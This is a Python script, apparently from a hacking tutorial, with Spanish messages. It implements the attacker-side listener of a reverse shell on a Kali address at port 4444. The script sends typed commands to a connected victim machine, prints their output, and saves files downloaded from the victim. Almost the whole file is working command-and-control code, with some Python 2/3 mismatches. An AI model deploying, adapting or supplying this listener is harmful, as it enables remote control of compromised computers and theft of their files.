import socket
import json


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #Ip de kali
        listener.bind((ip, port))
        listener.listen(0)

        print("[+] Esperando por conexiones")
        self.connection, address = listener.accept()
        print("[+] Tenemos una conexión de " + str(address))

    
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    
    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def escribir_archivo(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Descarga completa."


    def ejecutar_remoto(self, command):
        self.reliable_send(command)

        if command[0] == "salir":
            self.connection.close()
            exit()

        return self.reliable_recieve()
    
    
    def run(self):
        while True:
            #python 2.*: raw_input(); python 3.*: input() 
            command = input(">>")
            command = command.split(" ")
            result = self.ejecutar_remoto(command)

            if command[0] == "descargar":
                result = self.escribir_archivo(command[1], result)

            print(result)


escuchar = Listener("192.168.1.10", 4444)
escuchar.run()